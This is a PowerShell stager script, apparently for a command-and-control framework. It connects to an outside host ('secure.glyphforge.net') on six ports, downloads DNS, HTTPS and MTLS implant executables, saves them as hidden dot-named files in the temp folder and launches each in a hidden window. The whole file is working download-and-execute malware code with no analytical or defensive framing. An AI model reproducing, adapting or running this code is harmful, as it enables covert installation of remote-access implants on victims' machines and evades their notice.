$C2 = "secure.glyphforge.net"

function Invoke-TCPStage($port, $drop) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($C2, $port)
        $stream = $client.GetStream()

        $sizeBytes = New-Object byte[] 4
        $stream.Read($sizeBytes, 0, 4) | Out-Null
        $size = [System.BitConverter]::ToInt32($sizeBytes, 0)

        $data = New-Object byte[] $size
        $received = 0
        while ($received -lt $size) {
            $received += $stream.Read($data, $received, $size - $received)
        }
        $client.Close()

        [System.IO.File]::WriteAllBytes($drop, $data)
        Start-Process -FilePath $drop -WindowStyle Hidden
        Write-Host "[+] $drop started"
    } catch {
        Write-Host "[-] Failed port $port`: $_"
    }
}

Write-Host "[*] Staging implants..."

# Windows DNS
Invoke-TCPStage 2111 "$env:TEMP\.dns_b.exe"
Invoke-TCPStage 2112 "$env:TEMP\.dns_s.exe"

# Windows HTTPS
Invoke-TCPStage 2221 "$env:TEMP\.http_b.exe"
Invoke-TCPStage 2222 "$env:TEMP\.http_s.exe"

# Windows MTLS
Invoke-TCPStage 2331 "$env:TEMP\.mtls_b.exe"
Invoke-TCPStage 2332 "$env:TEMP\.mtls_s.exe"

Write-Host "[*] Done"
